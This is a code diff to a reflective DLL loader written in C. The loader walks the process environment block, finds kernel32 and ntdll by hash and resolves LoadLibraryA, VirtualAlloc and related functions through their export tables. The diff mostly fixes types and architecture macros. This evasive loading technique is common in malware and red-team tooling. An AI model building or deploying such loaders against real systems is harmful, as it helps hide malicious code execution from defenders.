@@ -8,6 +8,9 @@
 //      https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm
 
 #include "loader.h"
+#ifdef WIN_ARM
+#include "armintr.h"
+#endif
 
 #pragma intrinsic( _ReturnAddress )
 
@@ -30,13 +33,14 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter ) {
 
     // process environment block pointers
     ULONG_PTR pebAddress;
-    ULONG_PTR pPebLdrData;
+    PPEB_LDR_DATA pPebLdrData;
 
     // variables for processing module export tables
+    PIMAGE_NT_HEADERS moduleNtHeader;
     ULONG_PTR moduleBaseAddress;
-    ULONG_PTR moduleExportDir;
-    ULONG_PTR moduleFuncExportTable;
-    ULONG_PTR moduleFuncNameTable;
+    PIMAGE_EXPORT_DIRECTORY moduleExportDir;
+    PDWORD moduleFuncExportTable;
+    PDWORD moduleFuncNameTable;
     PWORD moduleFuncOrdinalTable;
     DWORD apiHashValue;
     USHORT remainingExports;
@@ -58,10 +62,10 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter ) {
     // ===========================================================//
 
     // Access the PEB
-#ifdef WIN_X64
+#ifdef _WIN64
     pebAddress = __readgsqword(0x60);
 #else
-#ifdef WIN_X86
+#ifdef _WIN32
     pebAddress = __readfsdword(0x30);
 #else WIN_ARM
     pebAddress = *(DWORD *)((BYTE *)_MoveFromCoprocessor( 15, 0, 13, 0, 2 ) + 0x30);
@@ -77,7 +81,7 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter ) {
     pebModuleEntry = (PLDR_DATA_TABLE_ENTRY)pPebLdrData->InMemoryOrderModuleList.Flink;
     while (pebModuleEntry) {
         // get pointer to current module name (unicode string)
-        pebModuleName = (PLDR_DATA_TABLE_ENTRY)pebModuleEntry->BaseDllName.Buffer;
+        pebModuleName = ((PLDR_DATA_TABLE_ENTRY)pebModuleEntry)->BaseDllName.Buffer;
 
         // Perform hash comparisons to check if we need to process this module
         // We want kernel32.dll and ntdll.dll
@@ -85,12 +89,12 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter ) {
         if (pebModuleNameHash == KERNEL32DLL_HASH || pebModuleNameHash == NTDLLDLL_HASH) {
             // Process module of interest - get the exported functions
             moduleBaseAddress = (ULONG_PTR)(pebModuleEntry->DllBase);
-            PIMAGE_NT_HEADERS moduleNtHeader = moduleBaseAddress + ((PIMAGE_DOS_HEADER)moduleBaseAddress)->e_lfanew;
+            moduleNtHeader = (PIMAGE_NT_HEADERS)(moduleBaseAddress + ((PIMAGE_DOS_HEADER)moduleBaseAddress)->e_lfanew);
 
             // Get export directory and related export info
             moduleExportDir = (PIMAGE_EXPORT_DIRECTORY)(moduleBaseAddress + moduleNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-            moduleFuncExportTable = (ULONG_PTR)(moduleBaseAddress + moduleExportDir->AddressOfFunctions);
-            moduleFuncNameTable = (ULONG_PTR)(moduleBaseAddress + moduleExportDir->AddressOfNames);
+            moduleFuncExportTable = (PDWORD)(moduleBaseAddress + moduleExportDir->AddressOfFunctions);
+            moduleFuncNameTable = (PDWORD)(moduleBaseAddress + moduleExportDir->AddressOfNames);
             moduleFuncOrdinalTable = (PWORD)(moduleBaseAddress + moduleExportDir->AddressOfNameOrdinals);
 
             // Grabbing a total of 3 APIs from Kernel32.dll, 1 from Ntdll.dll
@@ -134,4 +138,6 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter ) {
     if (pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache) {
         pLoadLibraryA((char*)lpParameter);
     }
+
+    return 0;
 }
